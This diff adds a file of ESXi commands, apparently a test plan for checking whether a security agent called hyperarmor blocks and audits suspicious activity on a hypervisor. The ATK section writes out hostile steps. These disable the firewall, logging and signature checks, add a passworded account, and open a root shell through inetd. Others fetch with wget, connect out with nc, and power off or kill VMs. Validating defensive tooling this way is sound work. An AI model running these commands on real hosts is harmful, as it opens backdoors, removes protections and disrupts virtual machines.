@@ -1,0 +1,196 @@
+
+This list of commands is intended to be used to test blocking and auditing of suspicious activities.
+
+!!! DANGER: these commands may result in damange to your machine. 
+
+Do not run these on a production or unprotected host.
+
+If you do not know what a command does, do not run it! 
+
+==========================
+
+DEP-05
+
+# esxcli software vib get -n hyperarmor
+
+# /etc/init.d/hyperarmor status
+
+DEP-06
+
+# /etc/init.d/hyperarmor status; tail -n 20 /var/log/hyperarmor.log
+
+APP-03
+
+# printf '#!/bin/sh\necho pwned\n' > /tmp/t.sh; chmod +x /tmp/t.sh
+
+# /tmp/t.sh
+
+# rm /tmp/t.sh /vmfs/volumes/<ds>/t.sh
+
+APP-05
+
+# esxcli system hostname get
+
+# esxcli system hostname set --host=
+
+APP-06
+
+# echo '# poc' >> /etc/rc.local.d/local.sh
+
+ATK-01
+
+# esxcli system settings kernel list -o execInstalledOnly
+
+# esxcli system settings kernel set -s execInstalledOnly -v FALSE
+
+# esxcli system settings kernel set -s execInstalledOnly -v TRUE
+
+ATK-02
+
+# esxcli software vib install -v /tmp/fake.vib --no-sig-check -f
+
+ATK-03
+
+# esxcli software acceptance get
+
+# esxcli software acceptance set --level CommunitySupported
+
+# esxcli software acceptance set --level <original level>
+
+ATK-04
+
+# esxcli network firewall get
+
+# esxcli network firewall set --enabled false
+
+# esxcli network firewall set --enabled false
+
+ATK-05
+
+# esxcli system syslog config get
+
+# esxcli system syslog config set –loghost=’’
+
+# esxcli system syslog config set –loghost=’(your syslog host)’
+
+ATK-06
+
+# esxcli system account add -i hapoc01 -p 'P@ssw0rd!' -c 'P@ssw0rd!'
+
+# passwd root
+
+# esxcli system account remove -i hapoc01
+
+ATK-07
+
+# vmkload_mod /tmp/poc_fake_module
+
+ATK-08
+
+# vsish -e get /hardware/bios/dmiInfo
+
+# vsish -e get /config/Migrate/intOpts/Enabled
+
+# vsish -e set /config/Migrate/intOpts/Enabled <current value> 
+
+ATK-09
+
+# esxcli vm process list
+
+# esxcli vm process kill -t soft -w <World_ID>
+
+# esxcli vm process kill -t hard -w <World_ID>
+
+# esxcli vm process kill -t force -w <World_ID>
+
+# ps | grep vmx
+
+ATK-10
+
+# esxcli system settings encryption get
+
+# esxcli system settings encryption set --mode=NONE
+
+ATK-11
+
+# wget http://example.com -O /tmp/x
+
+# nc <external-ip> 443
+
+# rm /tmp/x
+
+ATK-12
+
+# esxcli network vswitch standard list
+
+# esxcli network vswitch standard policy security get -v vSwitch0
+
+# esxcli network vswitch standard policy security set -v vSwitch0 -p true
+
+# esxcli network vswitch standard policy security set -v vSwitch0 -p false
+
+ATK-13
+
+# mkdir /vmfs/volumes/<datastorename>/hapoc/
+
+# vmkfstools -c 10M /vmfs/volumes/<datastorename>/hapoc/dummy.vmdk 
+
+# vmkfstools -U /vmfs/volumes/<datastorename>/hapoc/dummy.vmdk
+
+ATK-14
+
+# esxcli system secpolicy domain list
+
+# esxcli system secpolicy domain set -n <choose a domain from the above command’s result> -l disabled 
+
+# touch /tardisks/poc
+
+# esxcli system secpolicy domain set -n <domain> -l enforcing
+
+# rm /tardisks/poc
+
+ATK-15
+
+# cat /var/run/inetd.conf
+
+# echo 'poc stream tcp nowait root /bin/sh sh' >> /var/run/inetd.conf
+
+ATK-16
+
+# vim-cmd vmsvc/getallvms
+
+# esxcli storage filesystem list
+
+# esxcli network ip connection list
+
+# uname -a
+
+# vim-cmd hostsvc/enable_ssh
+
+# vim-cmd vmsvc/getallvms
+
+# vim-cmd vmsvc/power.off <vmid>
+
+# esxcli system settings encryption recovery list
+
+ATK-19
+
+# ls -l /opt/hyperarmor/vital/policies.pb
+
+# echo x >> /opt/hyperarmor/vital/policies.pb
+
+VIS-07
+
+# esxcli network ip interface set –enabled=false –interface-name=vmk0
+
+ADM-05
+
+# curl -k -H 'Authorization: Bearer <token>' https://<console>/api/v1/alerts/count
+
+OPS-05
+
+# esxcli software vib remove -n hyperarmor
+
+OPS-07
+
+# esxcli system ntp get
